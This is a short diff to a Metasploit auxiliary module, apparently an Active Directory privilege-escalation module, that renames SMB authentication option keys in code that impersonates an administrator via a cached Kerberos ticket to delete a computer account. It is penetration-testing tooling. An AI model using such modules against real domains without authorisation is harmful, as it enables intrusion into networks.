@@ -160,8 +160,8 @@ class MetasploitModule < Msf::Auxiliary
       if @privesc_success
         # If the privilege escalation succeeded, let'use the cached TGS
         # impersonating the admin to delete the computer account
-        datastore['SMBAuth'] = Msf::Exploit::Remote::AuthOption::KERBEROS
-        datastore['SmbRhostname'] = "#{datastore['DC_NAME']}.#{datastore['DOMAIN']}"
+        datastore['SMB::Auth'] = Msf::Exploit::Remote::AuthOption::KERBEROS
+        datastore['Smb::Rhostname'] = "#{datastore['DC_NAME']}.#{datastore['DOMAIN']}"
         datastore['SMBDomain'] = datastore['DOMAIN']
         datastore['DomainControllerRhost'] = rhost
         tree = connect_smb(username: datastore['IMPERSONATE'])
@@ -213,7 +213,7 @@ class MetasploitModule < Msf::Auxiliary
     datastore['SMBPass'] = password
     datastore['SMBDomain'] = domain
 
-    if datastore['SMBAuth'] == Msf::Exploit::Remote::AuthOption::KERBEROS
+    if datastore['SMB::Auth'] == Msf::Exploit::Remote::AuthOption::KERBEROS
       vprint_status("Connecting SMB with #{username}.#{domain} using Kerberos authentication")
     else
       vprint_status("Connecting SMB with #{username}.#{domain}:#{password}")
